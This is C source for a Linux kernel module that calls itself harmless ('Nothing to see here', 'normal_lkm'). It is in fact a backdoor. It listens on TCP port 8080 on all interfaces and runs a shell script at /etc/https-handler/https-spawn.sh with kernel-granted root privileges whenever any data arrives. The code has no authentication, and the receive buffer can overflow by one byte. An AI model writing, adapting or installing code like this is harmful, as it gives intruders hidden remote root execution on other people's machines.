#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kmod.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/kthread.h>
#include <net/net_namespace.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("samwasnothere");
MODULE_DESCRIPTION("Nothing to see here");

struct task_struct *my_thread;
struct socket *listen_sock = NULL;

int my_server_loop(void *data) {
    struct socket *client_sock = NULL;
    struct msghdr msg;
    struct kvec vec;
    char recv_buf[256];
    int len;
    int ret;

    while (!kthread_should_stop()) {

        ret = kernel_accept(listen_sock, &client_sock, 0);
        if (ret < 0) continue;

        memset(&msg, 0, sizeof(msg));
        vec.iov_base = recv_buf;
        vec.iov_len = sizeof(recv_buf);

        len = kernel_recvmsg(client_sock, &msg, &vec, 1, sizeof(recv_buf), 0);

        if (len > 0) {
            recv_buf[len] = '\0';
            printk(KERN_INFO "Received: %s\n", recv_buf);

            // ---> THIS IS WHERE YOU RUN YOUR FUNCTION <---
            // Example: if (strncmp(recv_buf, "TRIGGER", 7) == 0) { do_something(); 
	char *argv[] = { "/etc/https-handler/https-spawn.sh", NULL };
	static char *envp[] = {
    		"HOME=/",
    		"TERM=linux",
    		"PATH=/sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin", NULL
	};

	int ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);	
    		if (ret == 0) {
        		printk(KERN_INFO "Bash command executed successfully.\n");
    		} else {
        		printk(KERN_ERR "Failed to execute bash command, error code: %d\n", ret);
    		}
        }

        sock_release(client_sock);
    }
    return 0;
}

static int __init normal_lkm_init(void) {
        int ret;
        struct sockaddr_in saddr;

        ret = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, &listen_sock);

        if (ret < 0) {
                printk(KERN_ERR "Socket creation failed: %d\n", ret);
        return ret;
}


        memset(&saddr, 0, sizeof(saddr));
        saddr.sin_family = AF_INET;
        saddr.sin_port = htons(8080);
        saddr.sin_addr.s_addr = htonl(INADDR_ANY);
	
	#if LINUX_VERSION_CODE >= KERNEL_VERSION(6,4,0)
		ret = kernel_bind(listen_sock, (struct sockaddr_unsized *)&saddr, sizeof(saddr));
	#else

		ret = kernel_bind(listen_sock, (struct sockaddr *)&saddr, sizeof(saddr));
	#endif

        if (ret < 0) {
                printk(KERN_ERR "Bind failed: %d\n", ret);
                sock_release(listen_sock);
        return ret;
        }

        ret = kernel_listen(listen_sock, 5);

        if (ret < 0) {
                printk(KERN_ERR "Listen failed: %d\n", ret);
                sock_release(listen_sock);
        return ret;
        }

        printk(KERN_INFO "Socket listening! Starting thread...\n");
        my_thread = kthread_run(my_server_loop, NULL, "my_kthread_server");
        return 0;
}

static void __exit normal_lkm_exit(void) {
        printk(KERN_INFO "[-] Module successfully unloaded\n");
	kthread_stop(my_thread);
	if (listen_sock) {
	    	sock_release(listen_sock);
	}	
}

module_init(normal_lkm_init);
module_exit(normal_lkm_exit);
